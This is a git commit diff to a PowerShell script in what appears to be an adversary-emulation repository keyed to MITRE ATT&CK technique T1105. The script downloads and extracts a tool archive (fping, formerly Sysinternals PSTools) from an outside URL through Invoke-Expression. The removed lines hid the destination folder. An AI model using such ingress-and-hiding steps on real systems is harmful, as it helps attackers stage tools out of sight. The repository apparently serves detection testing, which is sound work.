af450b4b1658d20998be0fd6323902bc0971255e
Jim Benna <jim.benna@gmail.com>
2025-11-04 12:37:07 +0100

    Some cleanup

--- 0012_Command-And-Control/1202_Download_fping.ps1
+++ 0012_Command-And-Control/1202_Download_fping.ps1
@@ -1,26 +1,23 @@
-# Download and installs PSTools
+# Downloads fake documents archive
 # Technic ID : T1105
 Clear-Host
 Write-Output "==============================================================================="
-Write-Output "Download and installs PSTools (T1105)"
+Write-Output "Command and Control : Ingress Tool Transfer (T1105)"
 Write-Output "==============================================================================="
 #
-$ArchiveFile = "PSTools.zip"
-$DestinationDirectory = "$env:PUBLIC\PSTools"
-$Full_Destination = "$env:PUBLIC\Toolz\$ArchiveFile"
-$LogFile = "$env:PUBLIC\exf\pstools_down_extract.txt"; 
-$DownloadURL = "https://download.sysinternals.com/files/SysinternalsSuite.zip"
+$ArchiveFile = "fping.zip"
+$DestinationDirectory = "$env:PUBLIC\Toolz"
+$Full_Destination = "$DestinationDirectory"+"\"+"$ArchiveFile"
+$LogFile = "$env:PUBLIC\exf\fping_down_extract.txt"; 
+$DownloadURL = "https://github.com/dexit/fping-windows/releases/download/fping-4-2-win-binary/fping_x64_4.2.zip"
 $CompleteCommand = "Invoke-WebRequest -Uri" + " $DownloadURL" + " -outfile " + "$Full_Destination";
 try {
     Invoke-Expression  "$CompleteCommand";
     Write-Output "Successfully downloaded [$ArchiveFile] to $DestinationDirectory" | Out-File -FilePath "$LogFile" -Encoding ascii -Append; 
-    New-Item -ItemType "directory" $DestinationDirectory -Force;
-    $psdir = Get-Item "$DestinationDirectory" -Force;
-    $psdir.attributes = "hidden";
 
     if ([System.IO.File]::Exists("$Full_Destination")) {
         Add-Type -Assembly 'System.IO.Compression.FileSystem';
-        [System.IO.Compression.ZipFile]::ExtractToDirectory("$ArchiveFile", "$DestinationDirectory");
+        [System.IO.Compression.ZipFile]::ExtractToDirectory("$Full_Destination", "$DestinationDirectory");
         Write-Output "The file [$ArchiveFile] has been extracted to  $DestinationDirectory" | Out-File -FilePath "$LogFile" -Encoding ascii -Append;
         Get-ChildItem -Path $DestinationDirectory | Out-File -FilePath $LogFile -Encoding ascii -Append
         exit 0;
